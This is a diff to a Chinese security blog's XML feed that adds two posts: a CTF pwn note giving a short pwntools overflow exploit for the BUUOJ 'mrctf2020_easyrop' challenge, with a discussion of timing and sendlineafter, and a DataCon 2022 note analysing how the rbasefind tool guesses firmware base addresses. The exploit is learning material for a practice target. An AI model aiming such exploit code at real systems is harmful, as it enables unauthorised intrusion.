@@ -4,6 +4,27 @@
   
   
   <entry>
+    <title>遇到的奇奇怪怪问题汇总</title>
+    <link href="/2022/11/29/%E9%81%87%E5%88%B0%E7%9A%84%E5%A5%87%E5%A5%87%E6%80%AA%E6%80%AA%E9%97%AE%E9%A2%98%E6%B1%87%E6%80%BB/"/>
+    <url>/2022/11/29/%E9%81%87%E5%88%B0%E7%9A%84%E5%A5%87%E5%A5%87%E6%80%AA%E6%80%AA%E9%97%AE%E9%A2%98%E6%B1%87%E6%80%BB/</url>
+    
+    <content type="html"><![CDATA[<h4 id="sleep-？"><a href="#sleep-？" class="headerlink" title="sleep ？"></a>sleep ？</h4><p>题目：</p><p><a href="https://buuoj.cn/challenges#mrctf2020_easyrop">https://buuoj.cn/challenges#mrctf2020_easyrop</a></p><p>本来是很简单的一个溢出</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> time <span class="hljs-keyword">import</span> sleep<br><span class="hljs-comment">#r = process(&#x27;./mrctf2020_easyrop&#x27;)</span><br>r = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">25663</span>)<br>system_sh =<span class="hljs-number">0x000000000040072A</span><br>r.sendline(<span class="hljs-string">b&#x27;2&#x27;</span>)<br><span class="hljs-comment">#sleep(1)</span><br>r.sendline(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x300</span>)<br>r.sendline(<span class="hljs-string">b&#x27;7&#x27;</span>)<br><span class="hljs-comment">#sleep(1)</span><br>r.sendline(<span class="hljs-string">b&#x27;a&#x27;</span>* <span class="hljs-number">0x12</span> + p64(system_sh))<br>r.interactive()<br></code></pre></td></tr></table></figure><p>但是不加sleep无法通过</p><p>有人说是python同时发送多个字符串时会合并(?)</p><p>那什么时候情况下需要在sendline前面加一个sleep</p><p>​    [已解决] 打本地不加应该没事，打远程的时候肯定会有一点延迟，假如没有sendafter这一类的发送，就可能会造成后面的也一起发送了，所以每次写exp发送的时候最好用sendafter或者sendlineafter这样的话就不需要再担心sleep(1)了</p><hr>]]></content>
+    
+    
+    
+    <tags>
+      
+      <tag>ctf-pwn</tag>
+      
+      <tag>Others</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>ZJCTF 2019 EasyHeap</title>
     <link href="/2022/11/29/%5BZJCTF%202019%5DEasyHeap/"/>
     <url>/2022/11/29/%5BZJCTF%202019%5DEasyHeap/</url>
@@ -177,6 +198,29 @@
     <tags>
       
       <tag>ctf-pwn</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>菜鸡的2022datacon记录</title>
+    <link href="/2022/11/16/%E8%8F%9C%E9%B8%A1%E7%9A%842022datacon/"/>
+    <url>/2022/11/16/%E8%8F%9C%E9%B8%A1%E7%9A%842022datacon/</url>
+    
+    <content type="html"><![CDATA[<h4 id="固件基地址识别"><a href="#固件基地址识别" class="headerlink" title="固件基地址识别"></a>固件基地址识别</h4><p>rbasefind - <a href="https://github.com/sgayou/rbasefind">https://github.com/sgayou/rbasefind</a></p><p>此项目用rust写的，用<code>cargo build</code>之后会生成可执行文件在<code>target</code>路径下</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">rbasefind &lt;<span class="hljs-type">path</span>-<span class="hljs-keyword">to</span>-bin&gt; <br></code></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs sh">Located 4052 strings<br>Located 197089 pointers<br>Scanning with 2 threads...<br>0x2c0dc000: 3818<br>0x2c0dd000: 280<br>0x2c0db000: 274<br>0x2c0da000: 232<br>0x2c0de000: 228<br>0x2c0d7000: 202<br>0x2c0d9000: 200<br>0x2c0df000: 199<br>0x2c0e1000: 184<br>0x2c0e6000: 181<br></code></pre></td></tr></table></figure><p>通常来讲第一行（也就是数字最大的那个）为固件的基地址，但是很多时候识别不出来（比如几行都是1）</p><p>实际在datacon的数据上测试的结果，使用的时候所有参数都是default（因为当时并没有仔细看代码….）</p><p><img src="/img/datacon/1.jpg"></p><p>应该是50个固件识别成功了38个</p><h5 id="对rbasefind源码的分析"><a href="#对rbasefind源码的分析" class="headerlink" title="对rbasefind源码的分析"></a>对rbasefind源码的分析</h5><p>按程序执行顺序分析</p><ol><li><p><code>get_strings()</code></p><p>利用一个正则表达式匹配</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">[ -~<span class="hljs-symbol">\t</span>\r<span class="hljs-symbol">\n</span>]&#123;10,&#125;  // 从空格(48)到制表符(126) 以及 \r<span class="hljs-symbol">\n</span> 的所有有效字符 <br></code></pre></td></tr></table></figure><p>长度至少是10的字符串（10为参数minstrlen，最小字符串搜索长度）</p></li><li><p><code>get_pointers()</code></p><p>提取整个文件的u32（？），会根据参数<code>big_endian</code>判断文件的大小端</p></li><li><p><code>find_match() -&gt; Interval::get_range()</code></p><p>把32位地址空间平均分为n部分，n位参数的threads（开启的线程数）</p></li><li><p>每一个interval对应一个线程，以offset字节为一组（offset为输入的参数，默认为4096）</p></li><li><p>下面的代码中current_addr遍历了<code> [interval.start_addr : interval.end_addr : offset]</code></p><p>将每个str的首地址加上current_addr，把这些地址和pointers集合取交集</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-keyword">while</span> current_addr &lt;= interval.end_addr &#123;<br>    <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut </span><span class="hljs-variable">news</span> = FnvHashSet::<span class="hljs-title function_ invoke__">default</span>();<br>    <span class="hljs-keyword">for</span> <span class="hljs-variable">s</span> <span class="hljs-keyword">in</span> strings &#123;<br>        <span class="hljs-keyword">match</span> s.<span class="hljs-title function_ invoke__">checked_add</span>(current_addr) &#123;<br>            <span class="hljs-title function_ invoke__">Some</span>(add) =&gt; news.<span class="hljs-title function_ invoke__">insert</span>(add),<br>            <span class="hljs-literal">None</span> =&gt; <span class="hljs-keyword">continue</span>,<br>        &#125;;<br>    &#125;<br>    <span class="hljs-keyword">let</span> <span class="hljs-variable">intersection</span>: FnvHashSet&lt;_&gt; = news.<span class="hljs-title function_ invoke__">intersection</span>(pointers).<span class="hljs-title function_ invoke__">collect</span>();<br>    <span class="hljs-keyword">if</span> !intersection.<span class="hljs-title function_ invoke__">is_empty</span>() &#123;<br>        heap.<span class="hljs-title function_ invoke__">push</span>((intersection.<span class="hljs-title function_ invoke__">len</span>(), current_addr));<br>    &#125;<br>    <span class="hljs-keyword">match</span> current_addr.<span class="hljs-title function_ invoke__">checked_add</span>(config.offset) &#123;<br>        <span class="hljs-title function_ invoke__">Some</span>(_) =&gt; current_addr += config.offset,<br>        <span class="hljs-literal">None</span> =&gt; <span class="hljs-keyword">break</span>,<br>    &#125;;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>取出交集size最大的top n个current_addr进行输出</p><p>见本节最开头的示例，输出格式为 addr :  interaction_size</p><p>size最大的即认为是最有可能的基地址</p><p><strong>目前尚不清楚这样做的道理是什么</strong></p><p>猜测：首先，基地址是一个offset的倍数，那么遍历0~2^32所有offset的倍数（也就是current_offset），字符串在程序运行时会被装载到基地址后面的一段空间内，而pointers里会有很多指向字符串真实地址的指针，如果能将strings和pointers匹配上很多，说明这个current_addr就是程序的基地址</p><p>（纯瞎猜:broken_heart:）</p></li></ol><h4 id="函数符号恢复"><a href="#函数符号恢复" class="headerlink" title="函数符号恢复"></a>函数符号恢复</h4>]]></content>
+    
+    
+    
+    <tags>
+      
+      <tag>exp</tag>
+      
+      <tag>datacon</tag>
+      
+      <tag>iot-sec，powershell</tag>
       
     </tags>
     
